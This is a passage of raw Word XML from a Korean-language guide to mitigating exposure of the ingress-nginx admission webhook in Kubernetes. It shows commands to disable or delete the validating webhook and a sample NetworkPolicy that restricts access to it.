          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="14C22902" wp14:editId="5D550FEB">
                <wp:extent cx="4242391" cy="1066800"/>
                <wp:effectExtent l="0" t="0" r="25400" b="19050"/>
                <wp:docPr id="1112793414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391" cy="10668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775EE" w14:textId="77777777" w:rsidR="002E1308" w:rsidRPr="00484D84" w:rsidRDefault="002E1308" w:rsidP="002E1308">
                            <w:pPr>
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs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484D84">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs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bash</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="3223EE39" w14:textId="62A220A6" w:rsidR="002E1308" w:rsidRPr="00484D84" w:rsidRDefault="002E1308" w:rsidP="002E1308">
                            <w:pP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</w:pPr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helm upgrade ingress-nginx ingress-nginx/ingress-nginx \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  --set </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:proofErr w:type="gramStart"/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controller.admissionWebhooks.enabled</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:proofErr w:type="gramEnd"/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=false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C22902" id="_x0000_s1042" style="width:334.05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" fillcolor="white [3201]" strokecolor="black [3200]" strokeweight="1pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="0E6775EE" w14:textId="77777777" w:rsidR="002E1308" w:rsidRPr="00484D84" w:rsidRDefault="002E1308" w:rsidP="002E1308">
                      <w:pPr>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs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</w:pPr>
                      <w:r w:rsidRPr="00484D84">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs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bash</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="3223EE39" w14:textId="62A220A6" w:rsidR="002E1308" w:rsidRPr="00484D84" w:rsidRDefault="002E1308" w:rsidP="002E1308">
                      <w:pPr>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                      </w:pPr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helm upgrade ingress-nginx ingress-nginx/ingress-nginx \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  --set </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:proofErr w:type="gramStart"/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controller.admissionWebhooks.enabled</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:proofErr w:type="gramEnd"/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=false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725177B" w14:textId="649697B4" w:rsidR="002E1308" w:rsidRPr="002E1308" w:rsidRDefault="002E1308" w:rsidP="002E1308">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="92"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>kubectl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>매니페스트</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 설치 환경</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4B448785" wp14:editId="1BDC25E8">
                <wp:extent cx="4933507" cy="1066800"/>
                <wp:effectExtent l="0" t="0" r="19685" b="19050"/>
                <wp:docPr id="124539780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507" cy="10668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36A8C" w14:textId="77777777" w:rsidR="002E1308" w:rsidRPr="00484D84" w:rsidRDefault="002E1308" w:rsidP="002E1308">
                            <w:pPr>
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs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484D84">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs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bash</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="14DB6922" w14:textId="4319175D" w:rsidR="002E1308" w:rsidRPr="00484D84" w:rsidRDefault="002E1308" w:rsidP="002E1308">
                            <w:pP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</w:pPr>
                            <w:proofErr w:type="spellStart"/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kubectl</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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 delete </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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ValidatingWebhookConfiguration</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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 ingress-nginx-admission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448785" id="_x0000_s1043" style="width:388.45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" fillcolor="white [3201]" strokecolor="black [3200]" strokeweight="1pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="65C36A8C" w14:textId="77777777" w:rsidR="002E1308" w:rsidRPr="00484D84" w:rsidRDefault="002E1308" w:rsidP="002E1308">
                      <w:pPr>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs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</w:pPr>
                      <w:r w:rsidRPr="00484D84">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs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bash</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="14DB6922" w14:textId="4319175D" w:rsidR="002E1308" w:rsidRPr="00484D84" w:rsidRDefault="002E1308" w:rsidP="002E1308">
                      <w:pPr>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                      </w:pPr>
                      <w:proofErr w:type="spellStart"/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kubectl</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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 delete </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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ValidatingWebhookConfiguration</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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 ingress-nginx-admission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2E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>또는 Deployment/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>DaemonSet</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>에서 --validating-webhook 플래그 제거</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CCA22A3" w14:textId="77777777" w:rsidR="004B4A62" w:rsidRDefault="004B4A62" w:rsidP="00484D84">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="30C4EC5C" w14:textId="77777777" w:rsidR="004B4A62" w:rsidRDefault="004B4A62" w:rsidP="00484D84">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="254BA77E" w14:textId="77777777" w:rsidR="004B4A62" w:rsidRDefault="004B4A62" w:rsidP="00484D84">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="64E26071" w14:textId="77777777" w:rsidR="004B4A62" w:rsidRDefault="004B4A62" w:rsidP="00484D84">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59678C51" w14:textId="77777777" w:rsidR="004B4A62" w:rsidRDefault="004B4A62" w:rsidP="00484D84">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40CF3DF9" w14:textId="77777777" w:rsidR="004B4A62" w:rsidRDefault="004B4A62" w:rsidP="00484D84">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="513F7F75" w14:textId="77777777" w:rsidR="004B4A62" w:rsidRDefault="004B4A62" w:rsidP="00484D84">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2AC6DE1F" w14:textId="69893EEA" w:rsidR="00484D84" w:rsidRPr="002E1308" w:rsidRDefault="002E1308" w:rsidP="00484D84">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>네트워크</w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308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2E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>접근</w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308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2E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>제한</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Admission Controller</w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>가</w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>외부에서</w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>접근되지</w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>않도록</w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>네트워크</w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>정책을</w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>적용해야</w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>합니다</w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308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br/>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>예시</w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>정책</w:t>
      </w:r>
      <w:r w:rsidR="00484D84">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00484D84">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="21464164" wp14:editId="173BE3EF">
                <wp:extent cx="5324475" cy="5794744"/>
                <wp:effectExtent l="0" t="0" r="28575" b="15875"/>
                <wp:docPr id="100210490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5794744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64FFA" w14:textId="1DD15530" w:rsidR="00484D84" w:rsidRPr="00484D84" w:rsidRDefault="002E1308" w:rsidP="00484D84">
                            <w:pPr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text</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="04BA07CD" w14:textId="4E0BA4DA" w:rsidR="00484D84" w:rsidRPr="00484D84" w:rsidRDefault="002E1308" w:rsidP="002E1308">
                            <w:pP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</w:pPr>
                            <w:proofErr w:type="spellStart"/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apiVersion</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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: networking.k8s.io/v1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kind: </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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NetworkPolicy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metadata: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  name: restrict-admission-access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  namespace: ingress-nginx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spec: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  </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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podSelector</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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: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    </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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matchLabels</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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: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      app.kubernetes.io/component: admission-webhook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  ingress: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    - from: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        - </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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namespaceSelector</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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: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            </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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matchLabels</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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: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              kubernetes.io/metadata.name: </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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kube</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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-system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      ports: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        - port: 8443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          protocol: TCP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  </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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policyTypes</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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: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    - Ingress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464164" id="_x0000_s1044" style="width:419.25pt;height:45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" fillcolor="white [3201]" strokecolor="black [3200]" strokeweight="1pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="24264FFA" w14:textId="1DD15530" w:rsidR="00484D84" w:rsidRPr="00484D84" w:rsidRDefault="002E1308" w:rsidP="00484D84">
                      <w:pPr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text</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="04BA07CD" w14:textId="4E0BA4DA" w:rsidR="00484D84" w:rsidRPr="00484D84" w:rsidRDefault="002E1308" w:rsidP="002E1308">
                      <w:pPr>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                      </w:pPr>
                      <w:proofErr w:type="spellStart"/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apiVersion</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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: networking.k8s.io/v1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kind: </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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NetworkPolicy</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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metadata: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  name: restrict-admission-access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  namespace: ingress-nginx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spec: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  </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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podSelector</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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: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    </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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matchLabels</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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: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      app.kubernetes.io/component: admission-webhook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  ingress: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    - from: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        - </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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namespaceSelector</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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: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            </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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matchLabels</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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: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              kubernetes.io/metadata.name: </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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kube</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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-system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      ports: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        - port: 8443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          protocol: TCP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  </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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policyTypes</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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: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    - Ingress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C2F3CE8" w14:textId="41DCDF38" w:rsidR="002E1308" w:rsidRPr="002E1308" w:rsidRDefault="002E1308" w:rsidP="00484D84">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>이</w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>정책은</w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> admission-webhook Pod</w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>에</w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>kube</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">-system </w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>네임스페이스에서만</w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>접근을</w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
